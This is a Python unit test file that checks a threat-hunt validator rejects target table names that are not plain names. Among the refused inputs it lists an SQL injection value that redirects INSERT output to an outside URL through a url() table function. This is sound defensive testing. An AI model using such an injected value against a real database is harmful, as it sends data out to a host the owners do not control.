#  Project:      dfe-engine
#  File:         tests/unit/test_hunts/test_hunt_target_validation.py
#  Purpose:      HuntValidator refuses a results table that is not a plain table name
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""A hunt's target reaches ``INSERT INTO`` as text, so validation holds it to a table name.

The hunt API runs this validator on create and update. The runner holds the
same line at compile, for a hunt committed straight into the deploy repo. The
address below is in the documentation range (RFC 5737).
"""

from pathlib import Path

import pytest

from dfe_engine.hunts.validator import HuntValidator

EXFIL = "FUNCTION url('http://203.0.113.9/x', 'JSONEachRow') -- .x"

REFUSED = [
    EXFIL,
    "dfe.detection results",
    "dfe.detection()",
    "dfe.det'ection",
    "dfe.detection -- trailing",
    "cluster.dfe.detection",
]


def _hunt(**overrides) -> dict:
    hunt = {
        "log_buffer": 60,
        "global_source_table_name": "dfe.main",
        "customers": ["org_a"],
        "rules": [{"rule_name": "certutil", "initial_checkpoint_lookback_minutes": 10}],
    }
    hunt.update(overrides)
    return hunt


def _validate(rules_dir: Path, hunt: dict) -> None:
    HuntValidator.validate_hunt_configuration(hunt, rules_dir, "_timestamp_load")


@pytest.mark.parametrize("target", ["dfe.detection", "detection"])
def test_a_plain_hunt_target_validates(tmp_path: Path, target):
    _validate(tmp_path, _hunt(global_target_table_name=target))


@pytest.mark.parametrize("target", REFUSED)
def test_a_hunt_target_that_is_not_a_table_name_is_refused(tmp_path: Path, target):
    with pytest.raises(ValueError) as caught:
        _validate(tmp_path, _hunt(global_target_table_name=target))

    assert str(caught.value).startswith("Invalid 'global_target_table_name': ")
    assert "is not a table name" in str(caught.value)


@pytest.mark.parametrize("target", REFUSED)
def test_a_rule_target_that_is_not_a_table_name_is_refused(tmp_path: Path, target):
    rules = [{"rule_name": "certutil", "target_table_name": target}]

    with pytest.raises(ValueError) as caught:
        _validate(tmp_path, _hunt(global_target_table_name="dfe.detection", rules=rules))

    assert str(caught.value).startswith("Invalid 'target_table_name' of rule 'certutil': ")


def test_a_rule_target_that_is_not_text_is_refused(tmp_path: Path):
    rules = [{"rule_name": "certutil", "target_table_name": ["dfe", "detection"]}]

    with pytest.raises(ValueError, match="It should be a table name"):
        _validate(tmp_path, _hunt(rules=rules))


def test_an_empty_hunt_target_keeps_its_own_message(tmp_path: Path):
    with pytest.raises(ValueError, match="It should be a non-empty string"):
        _validate(tmp_path, _hunt(global_target_table_name="  "))
